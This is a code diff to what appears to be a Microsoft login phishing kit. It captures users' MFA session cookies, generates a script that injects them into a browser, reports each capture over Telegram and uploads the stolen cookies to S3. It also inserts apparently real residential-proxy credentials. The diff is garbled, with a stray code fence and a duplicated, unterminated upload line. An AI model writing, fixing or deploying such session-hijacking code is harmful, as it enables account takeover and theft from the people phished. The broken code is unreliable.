@@ -21,7 +21,7 @@ CACHE_DIR = "/tmp/mslogin_cache"
 ASSET_CACHE_DIR = "/tmp/asset_cache"
 os.makedirs(CACHE_DIR, exist_ok=True)
 os.makedirs(ASSET_CACHE_DIR, exist_ok=True)
-CACHE_TTL = 600  # 10 minutes
+CACHE_TTL = 21600  # 6 hours
 
 HOME_DIR = os.path.expanduser("~")
 BASE_CACHE_PATH = os.path.join(HOME_DIR, "AppData", "Local", "SysRunCache")
@@ -30,8 +30,8 @@ os.makedirs(BASE_CACHE_PATH, exist_ok=True)
 # === PROXY CONFIG ===
 PROXIES = [
     {
-        "http": "http://brd-customer-YOURID:YOURPASSWORD@zproxy.lum-superproxy.io:22225",
-        "https": "http://brd-customer-YOURID:YOURPASSWORD@zproxy.lum-superproxy.io:22225"
+        "http": "http://brd-customer-hl_f20da391-zone-datacenter_proxy1:cbeo1p2ho8ni@brd.superproxy.io:33335",
+        "https": "http://brd-customer-hl_f20da391-zone-datacenter_proxy1:cbeo1p2ho8ni@brd.superproxy.io:33335"
     },
 ]
 
@@ -411,13 +411,14 @@ def capture_cookies(driver, session_id):
 
     cookie_file = os.path.join(session_dir, "mfa_session_data.json")
     script_file = os.path.join(session_dir, "mfa_inject_all_domains.js")
-    with open(cookie_file```python
-, "w") as f:
+    with open(cookie_file, "w") as f:
         json.dump(relevant_cookies, f, indent=2)
     generate_injection_script(relevant_cookies, session_dir)
 
     send_telegram_message(f"✅ Session captured: {session_id}")
     if S3_BUCKET:
+        upload_to_s3(cookie_file, f"sessions/{session_id}/mfa_session_data.json")
+        upload_to_s3(script_file, f"s3_BUCKET:
         upload_to_s3(cookie_file, f"sessions/{session_id}/mfa_session_data.json")
         upload_to_s3(script_file, f"sessions/{session_id}/mfa_inject_all_domains.js")
 
